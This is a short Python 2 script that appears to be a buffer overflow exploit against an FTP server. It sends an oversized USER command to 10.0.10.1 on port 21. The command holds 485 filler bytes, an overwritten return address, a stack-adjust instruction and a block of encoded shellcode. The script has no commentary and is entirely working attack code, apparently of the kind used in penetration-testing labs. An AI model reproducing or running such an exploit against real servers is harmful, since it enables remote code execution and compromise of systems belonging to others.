#!/usr/bin/python

import socket

shellcode = ("\xbe\x0c\xa2\xd2\xa8\xdb\xc5\xd9\x74\x24\xf4\x5d\x29\xc9\xb1" +
"\x53\x31\x75\x12\x83\xc5\x04\x03\x79\xac\x30\x5d\x7d\x58\x36" +
"\x9e\x7d\x99\x57\x16\x98\xa8\x57\x4c\xe9\x9b\x67\x06\xbf\x17" +
"\x03\x4a\x2b\xa3\x61\x43\x5c\x04\xcf\xb5\x53\x95\x7c\x85\xf2" +
"\x15\x7f\xda\xd4\x24\xb0\x2f\x15\x60\xad\xc2\x47\x39\xb9\x71" +
"\x77\x4e\xf7\x49\xfc\x1c\x19\xca\xe1\xd5\x18\xfb\xb4\x6e\x43" +
"\xdb\x37\xa2\xff\x52\x2f\xa7\x3a\x2c\xc4\x13\xb0\xaf\x0c\x6a" +
"\x39\x03\x71\x42\xc8\x5d\xb6\x65\x33\x28\xce\x95\xce\x2b\x15" +
"\xe7\x14\xb9\x8d\x4f\xde\x19\x69\x71\x33\xff\xfa\x7d\xf8\x8b" +
"\xa4\x61\xff\x58\xdf\x9e\x74\x5f\x0f\x17\xce\x44\x8b\x73\x94" +
"\xe5\x8a\xd9\x7b\x19\xcc\x81\x24\xbf\x87\x2c\x30\xb2\xca\x38" +
"\xf5\xff\xf4\xb8\x91\x88\x87\x8a\x3e\x23\x0f\xa7\xb7\xed\xc8" +
"\xc8\xed\x4a\x46\x37\x0e\xab\x4f\xfc\x5a\xfb\xe7\xd5\xe2\x90" +
"\xf7\xda\x36\x0c\xff\x7d\xe9\x33\x02\x3d\x59\xf4\xac\xd6\xb3" +
"\xfb\x93\xc7\xbb\xd1\xbc\x60\x46\xda\xd3\x2c\xcf\x3c\xb9\xdc" +
"\x99\x97\x55\x1f\xfe\x2f\xc2\x60\xd4\x07\x64\x28\x3e\x9f\x8b" +
"\xa9\x14\xb7\x1b\x22\x7b\x03\x3a\x35\x56\x23\x2b\xa2\x2c\xa2" +
"\x1e\x52\x30\xef\xc8\xf7\xa3\x74\x08\x71\xd8\x22\x5f\xd6\x2e" +
"\x3b\x35\xca\x09\x95\x2b\x17\xcf\xde\xef\xcc\x2c\xe0\xee\x81" +
"\x09\xc6\xe0\x5f\x91\x42\x54\x30\xc4\x1c\x02\xf6\xbe\xee\xfc" +
"\xa0\x6d\xb9\x68\x34\x5e\x7a\xee\x39\x8b\x0c\x0e\x8b\x62\x49" +
"\x31\x24\xe3\x5d\x4a\x58\x93\xa2\x81\xd8\xa3\xe8\x8b\x49\x2c" +
"\xb5\x5e\xc8\x31\x46\xb5\x0f\x4c\xc5\x3f\xf0\xab\xd5\x4a\xf5" +
"\xf0\x51\xa7\x87\x69\x34\xc7\x34\x89\x1d")

buffer = "A" * 485 + "\x25\x10\xc3\x77" + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff"  + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect = s.connect(('10.0.10.1', 21))
response = s.recv(1024)
print response

s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response

s.send('PASS PASSWORD\r\n')
s.close()

